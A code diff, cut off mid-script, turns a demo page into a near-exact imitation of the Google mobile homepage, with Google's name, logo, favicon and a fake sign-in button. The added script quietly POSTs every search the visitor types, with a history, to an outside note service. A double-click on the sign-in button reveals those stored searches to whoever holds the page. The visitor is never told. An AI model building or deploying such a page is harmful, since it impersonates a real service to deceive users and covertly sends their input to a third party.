@@ -1,180 +1,830 @@
 <!DOCTYPE html>
 <html lang="id">
-<head> 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Sync t - Room Based Search</title>
-    <link rel="icon" href="https://www.google.com/favicon.ico">
-    <style>
-        /* RESET */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
-        body { background: #fff; color: #202124; min-height: 100vh; }
-        
-        /* HEADER */
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid #e8eaed; }
-        .logo { font-size: 3rem; font-weight: bold; letter-spacing: -2px; margin-bottom: 10px; 
-                background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
-                -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        /* MAIN CONTENT */
-        .container { max-width: 800px; margin: 30px auto; padding: 0 20px; }
-        
-        /* SEARCH BOX */
-        .search-box { border: 2px solid #dfe1e5; border-radius: 24px; padding: 12px 20px; 
-                     display: flex; align-items: center; margin-bottom: 20px; }
-        .search-box input { flex: 1; border: none; outline: none; font-size: 16px; 
-                           padding: 8px; background: transparent; }
-        .search-btn { background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; 
-                     padding: 10px 20px; margin: 0 5px; cursor: pointer; }
-        .search-btn:hover { border-color: #dadce0; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
-        
-        /* ROOM INFO */
-        .room-info { background: #f8f9fa; border-radius: 12px; padding: 20px; margin: 20px 0; }
-        .room-id { color: #1a73e8; font-weight: bold; font-size: 1.2em; }
-        .current-search { background: white; padding: 15px; border-radius: 8px; 
-                         margin: 15px 0; border-left: 4px solid #4285f4; }
-        
-        /* RESPONSIVE */
-        @media (max-width: 600px) {
-            .logo { font-size: 2.2rem; }
-            .search-box { padding: 10px 15px; }
-            .container { padding: 0 15px; }
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <div class="logo">Google</div>
-        <div style="color: #5f6368; font-size: 14px;">Room-based synchronized search</div>
-    </div>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Google</title>
+<link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+
+<style>
+  body {
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+    background: #fff;
+    color: #202124;
+  }
+
+  /* ===== TOP BAR ===== */
+  .topbar {
+    display: flex;
+    align-items: center;
+    padding: 12px 14px;
+    gap: 14px;
+  }
+
+  .menu {
+    font-size: 22px;
+    color: #5f6368;
+    cursor: pointer;
+  }
+
+  .tabs {
+    display: flex;
+    gap: 18px;
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  .tab.active {
+    color: #1a73e8;
+    position: relative;
+  }
+
+  .tab.active::after {
+    content: "";
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: -8px;
+    height: 3px;
+    background: #1a73e8;
+    border-radius: 2px;
+  }
+
+  .tab {
+    color: #5f6368;
+    cursor: pointer;
+  }
+
+  .right-icons {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .apps-icon {
+    width: 24px;
+    height: 24px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    cursor: pointer;
+  }
+
+  .login {
+    background: #1a73e8;
+    color: #fff;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    border: none;
+  }
+
+  /* ===== LOGO ===== */
+  .logo-container {
+    text-align: center;
+    margin: 30px 0 20px;
+  }
+
+  .google-logo {
+    width: 272px;
+    height: 92px;
+    margin: 0 auto;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92"><path fill="%234285f4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23ea4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23fbbc05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.43 10.16-22.09 21.25-22.09 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.14 5.71-12.14 13.52 0 7.73 5.42 13.36 12.14 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="%234285f4" d="M225 3v65h-9.5V3h9.5z"/><path fill="%2334a853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="%23ea4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35 0 53.33 0 34.91 0 16.58 16.32.56 35.3.56c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+  }
+
+  /* ===== SEARCH BAR (NORMAL MODE) ===== */
+  .search-container {
+    margin: 0 16px 24px;
+  }
+
+  .search-box {
+    border: 1px solid #dfe1e5;
+    border-radius: 24px;
+    display: flex;
+    align-items: center;
+    padding: 8px 14px;
+    gap: 12px;
+  }
+
+  .search-box:hover {
+    border-color: #dadce0;
+  }
+
+  .search-box input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 16px;
+    font-family: 'Arial', sans-serif;
+    caret-color: transparent;
+    background: transparent;
+  }
+
+  .search-icon {
+    width: 24px;
+    height: 24px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%239aa0a6" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+  }
+
+  .mic-icon {
+    width: 26px;
+    height: 26px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.91-3c-.49 0-.9.36-.98.85C16.52 14.2 14.47 16 12 16s-4.52-1.8-4.93-4.15c-.08-.49-.49-.85-.98-.85-.61 0-1.09.54-1 1.14.49 3 2.89 5.35 5.91 5.78V20c0 .55.45 1 1 1s1-.45 1-1v-2.08c3.02-.43 5.42-2.78 5.91-5.78.1-.6-.39-1.14-1-1.14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    cursor: pointer;
+  }
+
+  /* GOOGLE LENS - PAKAI URL DARI GITHUB ANDA */
+  .lens-icon {
+    width: 26px;
+    height: 26px;
+    background-image: url('https://raw.githubusercontent.com/taskIfaisal/sw/main/icon/google-lens.png');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    cursor: pointer;
+  }
+
+  /* ===== TRENDING (NORMAL MODE) ===== */
+  .section {
+    padding: 0 16px;
+  }
+
+  .section h3 {
+    font-size: 18px;
+    font-weight: 500;
+    margin: 10px 0;
+  }
+
+  .trend {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid #e0e0e0;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  .trend:hover {
+    background-color: #f8f9fa;
+  }
+
+  .trend-icon {
+    width: 18px;
+    height: 18px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235f6368" d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+  }
+
+  .trend-text {
+    color: #202124;
+  }
+
+  .trend:hover .trend-text {
+    text-decoration: underline;
+    color: #1a0dab;
+  }
+
+  /* ===== FOOTER ===== */
+  .footer {
+    margin-top: 20px;
+    padding: 14px 10px 24px;
+    background: #f2f2f2;
+    font-size: 13px;
+    color: #5f6368;
+    text-align: center;
+  }
+
+  .footer-row {
+    margin-bottom: 8px;
+  }
+
+  .footer span {
+    margin: 0 6px;
+    cursor: pointer;
+  }
+
+  .footer span:hover {
+    text-decoration: underline;
+  }
+
+  /* ===== SEARCH OVERLAY (POP-UP MODE) ===== */
+  .search-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: white;
+    z-index: 1000;
+    display: none;
+    flex-direction: column;
+    padding: 12px 16px;
+    box-sizing: border-box;
+  }
+
+  .search-overlay.active {
+    display: flex;
+  }
+
+  .overlay-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 8px;
+    border-bottom: 2px solid #1a73e8; /* GARIS BAWAH BIRU */
+  }
+
+  /* TANDA PANAH KIRI - DIPERBESAR DAN DIPERJELAS */
+  .back-button {
+    width: 32px;
+    height: 32px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%231a73e8" d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+
+  .overlay-search-container {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .overlay-search-container input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 16px;
+    font-family: 'Arial', sans-serif;
+    caret-color: transparent;
+    background: transparent;
+    padding: 8px 0;
+  }
+
+  .overlay-mic-icon {
+    width: 26px;
+    height: 26px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235F6368" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.91-3c-.49 0-.9.36-.98.85C16.52 14.2 14.47 16 12 16s-4.52-1.8-4.93-4.15c-.08-.49-.49-.85-.98-.85-.61 0-1.09.54-1 1.14.49 3 2.89 5.35 5.91 5.78V20c0 .55.45 1 1 1s1-.45 1-1v-2.08c3.02-.43 5.42-2.78 5.91-5.78.1-.6-.39-1.14-1-1.14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+
+  .overlay-lens-icon {
+    width: 26px;
+    height: 26px;
+    background-image: url('https://raw.githubusercontent.com/taskIfaisal/sw/main/icon/google-lens.png');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+
+  .overlay-trending {
+    margin-top: 20px;
+    flex: 1;
+    overflow-y: auto;
+  }
+
+  .overlay-trending h3 {
+    font-size: 18px;
+    font-weight: 500;
+    margin: 10px 0;
+  }
+
+  /* TRENDING DI OVERLAY - PAKAI IKON KACA PEMBESAR */
+  .overlay-trend {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid #e0e0e0;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  .overlay-trend:hover {
+    background-color: #f8f9fa;
+  }
+
+  .overlay-trend-icon {
+    width: 18px;
+    height: 18px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235f6368" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+  }
+
+  .overlay-trend-text {
+    color: #202124;
+  }
+
+  .overlay-trend:hover .overlay-trend-text {
+    text-decoration: underline;
+    color: #1a0dab;
+  }
+
+  /* Hide main content when overlay is active */
+  body.overlay-active .topbar,
+  body.overlay-active .logo-container,
+  body.overlay-active .section:not(.search-overlay .overlay-trending),
+  body.overlay-active .footer {
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  /* RESPONSIVE DESIGN */
+  @media (max-width: 600px) {
+    .google-logo {
+      width: 200px;
+      height: 68px;
+    }
     
-    <div class="container">
-        <div class="search-box">
-            <input type="text" id="searchInput" placeholder="Search or enter room ID...">
-        </div>
-        
-        <div style="text-align: center; margin: 20px 0;">
-            <button class="search-btn" onclick="searchGoogle()">Google Search</button>
-            <button class="search-btn" onclick="shareRoom()">Share This Room</button>
-        </div>
-        
-        <div class="room-info">
-            <div class="room-id">Room ID: <span id="roomId">loading...</span></div>
-            <div class="current-search">
-                <div style="font-size: 12px; color: #5f6368;">Current Search:</div>
-                <div id="currentSearch" style="font-size: 18px; font-weight: 500;">Loading...</div>
-            </div>
-            <div style="margin-top: 15px; font-size: 14px; color: #5f6368;">
-                <span id="userCount">1</span> user(s) in this room
-            </div>
-        </div>
-        
-        <div style="text-align: center; margin-top: 30px; color: #5f6368; font-size: 14px;">
-            <p>🔗 Share this URL to invite others to this room</p>
-            <p>🔄 All users in the same room see the same search</p>
-        </div>
+    .search-box {
+      padding: 10px 14px;
+    }
+    
+    .search-box input {
+      font-size: 16px;
+    }
+    
+    .tabs {
+      font-size: 13px;
+      gap: 12px;
+      display: flex !important;
+    }
+    
+    .tab.active::after {
+      bottom: -6px;
+    }
+    
+    .topbar {
+      padding: 10px 12px;
+      gap: 10px;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+<!-- MAIN CONTENT (normal view) -->
+<div class="topbar">
+  <div class="menu" title="Menu">☰</div>
+  <div class="tabs">
+    <div class="tab active" data-tab="all">SEMUA</div>
+    <div class="tab" data-tab="images">GAMBAR</div>
+  </div>
+  <div class="right-icons">
+    <div class="apps-icon" title="Google Apps"></div>
+    <button class="login" id="loginBtn">Masuk</button>
+  </div>
+</div>
+
+<div class="logo-container">
+  <div class="google-logo" title="Google"></div>
+</div>
+
+<div class="search-container">
+  <div class="search-box" id="searchForm">
+    <div class="search-icon" title="Search"></div>
+    <input type="text" placeholder="" id="searchInput" autocomplete="off" autocapitalize="off" spellcheck="false">
+    <div class="mic-icon" id="micButton" title="Search by voice"></div>
+    <div class="lens-icon" id="lensButton" title="Search by image with Google Lens"></div>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Trending searches</h3>
+  <div id="trendingContainer">
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Pemilu 2024</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Harga Emas Hari Ini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Gempa Terkini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Jadwal Bola Malam Ini</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Rupiah vs USD</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Cuaca Jakarta</div></div>
+    <div class="trend"><div class="trend-icon"></div><div class="trend-text">Berita Terkini</div></div>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="footer-row">
+    <span>Dark theme: disabled</span>
+    <span id="settingsBtn">Settings</span>
+    <span id="privacyBtn">Privacy</span>
+    <span id="termsBtn">Terms</span>
+  </div>
+  <div class="footer-row">
+    <span id="advertisingBtn">Advertising</span>
+    <span id="businessBtn">Business</span>
+    <span id="aboutBtn">About</span>
+  </div>
+</div>
+
+<!-- SEARCH OVERLAY (POP-UP MODE) -->
+<div class="search-overlay" id="searchOverlay">
+  <div class="overlay-header">
+    <div class="back-button" id="backButton" title="Kembali"></div>
+    <div class="overlay-search-container">
+      <input type="text" id="overlaySearchInput" placeholder="Telusuri Google" autocomplete="off" autocapitalize="off" spellcheck="false">
+      <div class="overlay-mic-icon" id="overlayMicButton" title="Search by voice"></div>
+      <div class="overlay-lens-icon" id="overlayLensButton" title="Search by image with Google Lens"></div>
     </div>
+  </div>
+  <div class="overlay-trending">
+    <h3>Trending searches</h3>
+    <div id="overlayTrendingContainer"></div>
+  </div>
+</div>
 
-    <script>
-        // Get room ID from URL
-        function getRoomId() {
-            const path = window.location.pathname;
-            const parts = path.split('/').filter(p => p);
-            if (parts.length > 0 && parts[0] !== 'index.html') {
-                return parts[0];
-            } else {
-                // Generate random room ID if none
-                const newId = Math.floor(1000 + Math.random() * 9000);
-                window.history.replaceState({}, '', '/' + newId);
-                return newId.toString();
-            }
-        }
+<script>
+  // API CONFIGURATION
+  const API_URL = 'https://tinynote.pw/api/2NAK';
+  let syncInterval = null;
+  let lastNoteData = null;
+  let clickCount = 0;
+  let clickTimer = null;
 
-        // Initialize
-        const roomId = getRoomId();
-        document.getElementById('roomId').textContent = roomId;
-        
-        // Load saved search from localStorage
-        function loadRoomData() {
-            const storageKey = 'room_' + roomId;
-            let data = localStorage.getItem(storageKey);
-            
-            if (!data) {
-                data = JSON.stringify({
-                    search: 'Welcome to Google Sync!',
-                    users: 1,
-                    updated: new Date().toISOString()
-                });
-                localStorage.setItem(storageKey, data);
-            }
-            
-            const parsed = JSON.parse(data);
-            document.getElementById('currentSearch').textContent = parsed.search;
-            document.getElementById('searchInput').value = parsed.search;
-            document.getElementById('userCount').textContent = parsed.users;
-            
-            // Simulate multiple users
-            const userCount = Math.min(10, Math.floor(Math.random() * 10) + 1);
-            document.getElementById('userCount').textContent = userCount;
+  // Deteksi iOS Safari untuk mencegah app opening
+  function isIOS() {
+    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+  }
+
+  function isSafari() {
+    const ua = navigator.userAgent;
+    return /^((?!chrome|android).)*safari/i.test(ua) || 
+           (isIOS() && !/CriOS|FxiOS|EdgiOS|OPiOS/.test(ua));
+  }
+
+  // ========== API FUNCTIONS ==========
+  async function getNoteData() {
+    try {
+      const response = await fetch(API_URL);
+      if (!response.ok) return null;
+      const data = await response.json();
+      if (data && data.note) {
+        lastNoteData = data.note;
+        try {
+          const parsedNote = JSON.parse(data.note);
+          return parsedNote;
+        } catch (e) {
+          return { search: data.note };
         }
-        
-        // Update search
-        function updateSearch() {
-            const searchTerm = document.getElementById('searchInput').value.trim();
-            if (!searchTerm) return;
-            
-            const storageKey = 'room_' + roomId;
-            const data = JSON.parse(localStorage.getItem(storageKey) || '{}');
-            data.search = searchTerm;
-            data.updated = new Date().toISOString();
-            localStorage.setItem(storageKey, JSON.stringify(data));
-            
-            document.getElementById('currentSearch').textContent = searchTerm;
-            alert('Search updated for all users in room ' + roomId);
+      }
+      return null;
+    } catch (error) {
+      return null;
+    }
+  }
+
+  async function saveNoteData(searchTerm) {
+    try {
+      const currentData = await getNoteData();
+      let noteData = {
+        search: searchTerm,
+        timestamp: Date.now(),
+        history: []
+      };
+      if (currentData && currentData.search) {
+        noteData.history = [currentData.search];
+        if (currentData.history && Array.isArray(currentData.history)) {
+          noteData.history = [...currentData.history.slice(0, 4), currentData.search];
         }
-        
-        // Search Google
-        function searchGoogle() {
-            const searchTerm = document.getElementById('searchInput').value.trim();
-            if (searchTerm) {
-                updateSearch();
-                window.open('https://www.google.com/search?q=' + encodeURIComponent(searchTerm), '_blank');
+      }
+      const response = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ note: JSON.stringify(noteData) })
+      });
+      return response.ok;
+    } catch (error) {
+      return false;
+    }
+  }
+
+  // ========== SYNC FUNCTIONS ==========
+  async function syncData() {
+    const data = await getNoteData();
+    if (data && data.search) {
+      const searchInput = document.getElementById('searchInput');
+      const overlaySearchInput = document.getElementById('overlaySearchInput');
+      if (searchInput && !searchInput.matches(':focus')) {
+        searchInput.value = data.search;
+      }
+      if (overlaySearchInput && !overlaySearchInput.matches(':focus')) {
+        overlaySearchInput.value = data.search;
+      }
+    }
+  }
+
+  function startAutoSync() {
+    setTimeout(syncData, 1000);
+    syncInterval = setInterval(syncData, 3000);
+  }
+
+  // ========== SEARCH FUNCTIONS ==========
+  function createSafeGoogleURL(query) {
+    const encodedQuery = encodeURIComponent(query);
+    const timestamp = Date.now();
+    return `https://www.google.com/search?q=${encodedQuery}&igu=1&client=safari&_=${timestamp}&noredirect=1&pf=1`;
+  }
+
+  function performSearch(query) {
+    const searchQuery = query.trim();
+    if (!searchQuery) return false;
+    saveNoteData(searchQuery);
+    const googleURL = createSafeGoogleURL(searchQuery);
+    if (isIOS() && isSafari()) {
+      setTimeout(() => { window.location.replace(googleURL); }, 50);
+    } else {
+      window.location.href = googleURL;
+    }
+    return false;
+  }
+
+  function openGoogleLink(url) {
+    const timestamp = Date.now();
+    const separator = url.includes('?') ? '&' : '?';
+    const safeURL = url + separator + `igu=1&client=safari&_=${timestamp}&noredirect=1`;
+    if (isIOS() && isSafari()) {
+      setTimeout(() => { window.location.href = safeURL; }, 50);
+    } else {
+      window.location.href = safeURL;
+    }
+    return false;
+  }
+
+  // ========== OVERLAY FUNCTIONS ==========
+  const overlay = document.getElementById('searchOverlay');
+  const searchInput = document.getElementById('searchInput');
+  const overlaySearchInput = document.getElementById('overlaySearchInput');
+  const backButton = document.getElementById('backButton');
+  const trendingContainer = document.getElementById('trendingContainer');
+  const overlayTrendingContainer = document.getElementById('overlayTrendingContainer');
+
+  function cloneTrendingToOverlay() {
+    if (!trendingContainer || !overlayTrendingContainer) return;
+    overlayTrendingContainer.innerHTML = '';
+    
+    const trends = trendingContainer.querySelectorAll('.trend');
+    trends.forEach(trend => {
+      const trendText = trend.querySelector('.trend-text').textContent;
+      
+      const overlayTrend = document.createElement('div');
+      overlayTrend.className = 'overlay-trend';
+      overlayTrend.innerHTML = `
+        <div class="overlay-trend-icon"></div>
+        <div class="overlay-trend-text">${trendText}</div>
+      `;
+      
+      overlayTrend.addEventListener('click', function() {
+        const term = this.querySelector('.overlay-trend-text').textContent;
+        overlaySearchInput.value = term;
+        performSearch(term);
+      });
+      
+      overlayTrendingContainer.appendChild(overlayTrend);
+    });
+  }
+
+  function openSearchOverlay() {
+    overlay.classList.add('active');
+    document.body.classList.add('overlay-active');
+    overlaySearchInput.value = searchInput.value;
+    cloneTrendingToOverlay();
+    setTimeout(() => { overlaySearchInput.focus(); }, 100);
+  }
+
+  function closeSearchOverlay() {
+    overlay.classList.remove('active');
+    document.body.classList.remove('overlay-active');
+    searchInput.value = overlaySearchInput.value;
+  }
+
+  // ========== DOUBLE CLICK HANDLER ==========
+  function setupDoubleClickHandler() {
+    const loginBtn = document.getElementById('loginBtn');
+    loginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      clickCount++;
+      if (clickCount === 1) {
+        clickTimer = setTimeout(() => {
+          clickCount = 0;
+          openGoogleLink('https://accounts.google.com');
+        }, 300);
+      } else if (clickCount === 2) {
+        clearTimeout(clickTimer);
+        clickCount = 0;
+        getNoteData().then(data => {
+          if (data && data.search) {
+            if (searchInput) {
+              searchInput.value = data.search;
+              searchInput.focus();
+              if (data.history && data.history.length > 0) {
+                updateTrendingWithHistory(data.history);
+              }
             }
-        }
-        
-        // Share room
-        function shareRoom() {
-            const url = window.location.href;
-            if (navigator.share) {
-                navigator.share({
-                    title: 'Google Sync Room ' + roomId,
-                    text: 'Join my synchronized Google search room!',
-                    url: url
-                });
-            } else {
-                navigator.clipboard.writeText(url)
-                    .then(() => alert('Room link copied to clipboard!'))
-                    .catch(() => prompt('Copy this link:', url));
-            }
-        }
-        
-        // Enter key support
-        document.getElementById('searchInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                searchGoogle();
-            }
+          }
         });
-        
-        // Load on start
-        window.addEventListener('load', loadRoomData);
-        
-        // Auto-refresh simulation
-        setInterval(() => {
-            const userCountEl = document.getElementById('userCount');
-            let count = parseInt(userCountEl.textContent);
-            count = Math.max(1, count + (Math.random() > 0.7 ? 1 : -1));
-            userCountEl.textContent = count;
-        }, 10000);
-    </script>
+      }
+    });
+  }
+
+  function updateTrendingWithHistory(history) {
+    if (!trendingContainer || !history || history.length === 0) return;
+    const originalTrending = Array.from(trendingContainer.children).slice(0, 4);
+    trendingContainer.innerHTML = '';
+    history.slice(0, 4).forEach((searchTerm) => {
+      const trendElement = document.createElement('div');
+      trendElement.className = 'trend';
+      trendElement.innerHTML = `<div class="trend-icon"></div><div class="trend-text">${searchTerm}</div>`;
+      trendElement.addEventListener('click', function() {
+        const term = this.querySelector('.trend-text').textContent;
+        searchInput.value = term;
+        performSearch(term);
+      });
+      trendingContainer.appendChild(trendElement);
+    });
+    originalTrending.forEach(trend => { trendingContainer.appendChild(trend); });
+    cloneTrendingToOverlay();
+    setTimeout(() => {
+      if (trendingContainer.children.length > 7) {
+        trendingContainer.innerHTML = '';
+        originalTrending.forEach(trend => { trendingContainer.appendChild(trend.cloneNode(true)); });
+        cloneTrendingToOverlay();
+      }
+    }, 10000);
+  }
+
+  // ========== EVENT LISTENERS ==========
+  function setupEventListeners() {
+    const searchForm = document.getElementById('searchForm');
+    const micButton = document.getElementById('micButton');
+    const lensButton = document.getElementById('lensButton');
+    const overlayMicButton = document.getElementById('overlayMicButton');
+    const overlayLensButton = document.getElementById('overlayLensButton');
+    
+    searchForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      performSearch(searchInput.value);
+      return false;
+    }, true);
+    
+    searchInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        performSearch(this.value);
+        return false;
+      }
+    });
+    
+    overlaySearchInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        performSearch(this.value);
+        return false;
+      }
+    });
+    
+    searchInput.addEventListener('click', function(e) {
+      e.preventDefault();
+      openSearchOverlay();
+    });
+    
+    document.querySelector('.search-box').addEventListener('click', function(e) {
+      if (e.target.tagName !== 'INPUT') {
+        e.preventDefault();
+        openSearchOverlay();
+      }
+    });
+    
+    backButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      closeSearchOverlay();
+    });
+    
+    setTimeout(() => {
+      searchInput.placeholder = "Telusuri Google";
+      setTimeout(() => searchInput.placeholder = "", 1500);
+    }, 100);
+    
+    micButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Voice search: Silakan ucapkan pencarian Anda.');
+      return false;
+    });
+    
+    lensButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      openGoogleLink('https://lens.google.com');
+      return false;
+    });
+    
+    overlayMicButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Voice search: Silakan ucapkan pencarian Anda.');
+      return false;
+    });
+    
+    overlayLensButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      openGoogleLink('https://lens.google.com');
+      return false;
+    });
+    
+    document.querySelector('.apps-icon').addEventListener('click', function(e) {
+      e.preventDefault();
+      openGoogleLink('https://www.google.com/intl/id_id/about/products');
+      return false;
+    });
+    
+    document.querySelector('.menu').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Menu Google\n\n• Telusuri\n• Gambar\n• Video\n• Berita\n• Peta\n• Lainnya');
+      return false;
+    });
+    
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        this.classList.add('active');
+        if (this.dataset.tab === 'images') {
